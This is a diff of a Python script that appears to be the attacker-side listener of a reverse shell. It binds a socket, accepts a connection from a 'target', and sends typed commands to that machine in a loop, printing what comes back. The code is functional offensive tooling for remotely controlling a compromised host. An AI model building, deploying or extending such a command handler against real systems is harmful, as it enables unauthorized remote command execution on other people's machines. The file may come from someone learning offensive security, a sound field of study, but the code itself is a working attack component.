@@ -3,55 +3,68 @@ import socket
 import sys
 
 ''' Locally bind a socket to port so it can receive data '''
-#def listen_sock(port):
-#    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#    try:
-#        s.bind(('0.0.0.0', port))
-#    except socket.error as msg:
-#        sys.exit("Error: {}\nBind failed. Pagan...".format(msg))
-#    
-#    print("Binding is done")
-#    listen_conns = s.listen(1)
-#    print("Listening connections: {}".format(listen_conns))
-#    print('Socket is listening... on port {}'.format(port))
-    # Wait infinitely
-    #'''
-    #while 1:
-    #    conn, addr = s.accept()
-    #    print("Connected: {}".format(addr))
-    #No command handler available on the listener
-    #'''
-    #s.close()
-
-def main():
-    attacker = "0.0.0.0"
-    port = int(sys.argv[1])
-    # create()
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    s.bind((attacker, port))
-
-    s.listen(1)
-    print("Listening on port: {}".format(port))
-
-    client_socket, client_address = s.accept()
-    print("{}: connected", client_address[1])
-
-    message = "Hello and welcome".encode()
-    client_socket.send(message)
+def handle_sock(port):
+    s = socket.socket()
+    serv_host = '0.0.0.0'
+    try:
+        s.bind((serv_host, port))
+        print("Binding is done")
+    except socket.error as msg:
+        sys.exit("Error: {}\nBind failed. You pagan...".format(msg))
+    
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    listen_conns = s.listen(1)
+    print("Socket is listening... on port {}".format(port))
+    conn, addr = s.accept()
+    test = "Get this??".encode()
+    conn.send(test)
     while True:
+        # This opens the socket up for taking in connections
+        # conn is the actual socket, addr is used for addressing purposes
+        #conn, addr = s.accept()
+        print("Connected to target: {}".format(addr[0]))
+        # Command handler 
+        command = input("$")
+        # Sending input over the wire which means string values are a no-no
+        conn.send(command.encode())
+        if command.lower() == "exit":
+            break
+
+        # Add the cd functionality
+        # Receive command results here:
+        result = conn.recv(1024).decode()
+        print(result)
+
+
+    # We close the entire established connection and the socket file descriptor which opened i
+    #conn.close()
+    #s.close()
+def main():
+    try:
+        port = int(sys.argv[1])
+        handle_sock(port)
+    except KeyboardInterrupt:
+        sys.exit("Exiting...")
+
+    #client_socket, client_address = s.accept()
+    
+    #print("{}: connected", client_address[1])
+
+    #message = "Hello and welcome".encode()
+    #client_socket.send(message)
+    #while True:
     	# get the command from prompt
-    	command = input("Enter the command you wanna execute:")
+    #	command = input("Enter the command you wanna execute:")
     	# send the command to the client
-    	client_socket.send(command.encode())
-    	if command.lower() == "exit":
+    #	client_socket.send(command.encode())
+    #	if command.lower() == "exit":
         	# if the command is exit, just break out of the loop
-        	break
+    #    	break
     	# retrieve command results
-    	results = client_socket.recv(1024).decode()
+    #	results = client_socket.recv(1024).decode()
     	# print them
-    	print(results)
+    #	print(results)
     # close connection to the client
-    client_socket.close()
-    s.close()
+    #client_socket.close()
+    #s.close()
 main()
